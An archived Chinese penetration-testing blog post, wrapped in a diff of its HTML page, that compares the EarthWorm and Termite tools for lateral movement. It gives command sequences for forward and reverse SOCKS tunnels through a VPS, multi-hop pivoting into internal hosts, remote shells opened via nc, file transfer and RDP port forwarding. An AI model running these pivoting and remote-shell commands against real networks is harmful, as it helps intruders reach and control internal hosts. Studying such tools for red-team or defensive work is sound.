@@ -1,0 +1,382 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Termite代理工具 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的
+正向socks v5服务器
+https://xianzhi.aliyun.com/forum/read/735.html以上面这个文章作为例子，来说下对应的转发与代理
+如果目标有一个外网IP：
+ew来说建立socks代理服务：
+ew -s ssocksd -l 8888
+Termite:
+agent_exe -l 8888
+admin_exe -c [tartet_ip] -p 8888
+然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
+goto 1
+socks 1080
+此时VPS上面的1080就架设了一个服务器。
+
+反弹socks服务器假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的："> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Termite代理工具"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Termite代理工具</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p>
+<p>正向socks v5服务器</p>
+<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>以上面这个文章作为例子，来说下对应的转发与代理</p>
+<p>如果目标有一个外网IP：</p>
+<p>ew来说建立socks代理服务：</p>
+<p><code>ew -s ssocksd -l 8888</code></p>
+<p>Termite:</p>
+<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
+admin_exe -c [tartet_ip] -p 8888
+然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
+goto 1
+socks 1080
+此时VPS上面的1080就架设了一个服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="反弹socks服务器"><a href="#反弹socks服务器" class="headerlink" title="反弹socks服务器"></a>反弹socks服务器</h2><p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p>
+<pre class="line-numbers language-none"><code class="language-none">VPS： ew -s rcsocks -l 1080 -e 888
+Target: ew -s rssocks -d 139.x.x.113 -e 888
+此时就可以以vps上面1080端口作为代理进入内网<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Termite:</p>
+<pre class="line-numbers language-none"><code class="language-none">VPS:  .&#x2F;agent_exe -l 888
+Target: .&#x2F;agent_exe -c [139.x.x.113] -p 888
+VPS: .&#x2F;admin_exe -c 127.0.0.1 -p 888
+此时获取一个admin的终端，然后查看节点，target会变成2节点，
+goto 2
+socks 1080  &#x2F;&#x2F;现在可以以vps上面1080作为代理进入目标内网
+shell 6666  &#x2F;&#x2F;在vps上面直接nc 127.0.0.1 6666可以获取目标主机的shell
+downfile和upfile  &#x2F;&#x2F;可以直接下载上传文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="二级网络环境-一"><a href="#二级网络环境-一" class="headerlink" title="二级网络环境(一)"></a>二级网络环境(一)</h3><p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a> </p>
+<p>这个环境稍微复杂一点，大家可以看着图</p>
+<pre class="line-numbers language-none"><code class="language-none">分为4个步骤：
+
+VPS: ew -s lcx_listen -l 10800 -e 888  &#x2F;&#x2F;在vps上面添加转接隧道，把10800端口收到的代理请求转发给888
+
+B: ew -s ssocksd -l 999   &#x2F;&#x2F;B主机启动socks代理，端口999
+
+A: ew -s lcx_slave -d 139.x.x.113 -e 888 -f 10.48.128.49 -g 999 &#x2F;&#x2F;在A主机上面使用lcx_slave的方式，把公网的888端口和B主机的999端口连接起来
+
+现在可以通过vps的10800来使用B主机架设的socks5代理
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Termite是这样:</p>
+<pre class="line-numbers language-none"><code class="language-none">VPS: .&#x2F;agent_exe -l 888
+A主机: .&#x2F;agent_exe -c [139.x.x.113] -p 888
+VPS: .&#x2F;admin_exe -c 127.0.0.1 -p 888
+goto 2
+listen 999
+B主机: .&#x2F;agent_exe -c 10.48.128.49 -p 999
+此时B主机节点是3
+goto 3 
+socks 10800
+
+此时就可以以VPS上面的10800作为socks代理，进入B的内网。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从上面的操作可以看出来Termite只要把agent节点互相连接起来，就可以在admin里面跳来跳去，跳到哪里就可以以那个节点作为socks代理，或者端口转发，或者把那个节点开一个shell。</p>
+<p>比如上面在B主机开一个shell:</p>
+<pre class="line-numbers language-none"><code class="language-none">goto 3
+shell 7777
+然后在vps上面 nc 127.0.0.1 7777就获得B主机的shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>一句话: 只要agent节点之间互联，admin就可以随便跳</p>
+<h3 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境:"></a>三级网络环境:</h3><p>ew是这样操作的:</p>
+<pre class="line-numbers language-none"><code class="language-none">VPS: ew -s rcsoskc -l 1080 -e 888
+A: ew -s lcx_slave -d 139.x.x.113 -e 888 -f 10.48.128.12 -g 999
+B: ew -s lcx_listen -l 999 -e 777
+C: ew -s rssocks -d 10.48.128.12 -e 777
+
+此时就可以通过VPS上面的139.x.x.113的1080端口来使用在C主机架设的socks5代理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Termite:</p>
+<pre class="line-numbers language-none"><code class="language-none">VPS: .&#x2F;agent_exe -l 888
+A主机: .&#x2F;agent_exe -c [139.x.x.113] -p 888
+VPS: .&#x2F;admin_exe -c 127.0.0.1 -p 888
+B: .&#x2F;agent_exe -l 999  &#x2F;&#x2F;B主机开启一个监听
+goto 2 &#x2F;&#x2F;跳转到A节点
+connect 10.48.128.12  999 &#x2F;&#x2F;连接到B主机
+
+C: .&#x2F;agent_exe -l 777
+goto 3  &#x2F;&#x2F;跳转到B主机节点
+connect 192.168.0.10 777  &#x2F;&#x2F;在B节点连接C主机
+
+或者在C节点直接连接B:
+
+goto 3 &#x2F;&#x2F;跳到B
+listen 666
+C: .&#x2F;agent_exe -c 10.48.128.12 666
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>上面的连接方式可能会存在错误的地方，请指正 ＝。＝  另外各位大佬在使用过程中有啥问题，也丢出来一起讨论下呗</p>
+<p>注意的点：</p>
+<ul>
+<li>shell指令在使用nc连接过去之后，如果10s内没操作会自动断开，这个作者在视频里说过了，大家如果有需求可以发邮件给作者</li>
+<li>lcxtran这个忘了说了，这个跟上面指令差不多，是一个端口转发。比如在B节点lcxtran 10000 C的IP 3389，此时连接vps上面的10000就可以连接C的3389啦</li>
+</ul>
+<p>参考资料:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/README.txt">http://rootkiter.com/Termite/README.txt</a></li>
+<li><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2018/02/03/termite-socks.html" class="leancloud-visitors view" data-flag-title="Termite代理工具">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2018/03/02/openresty-https.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2018/02/02/xxe.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2018-02-03 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%8D%E5%BC%B9socks%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-article-text">反弹socks服务器</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83-%E4%B8%80"><span class="toc-article-text">二级网络环境(一)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%89%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"><span class="toc-article-text">三级网络环境:</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
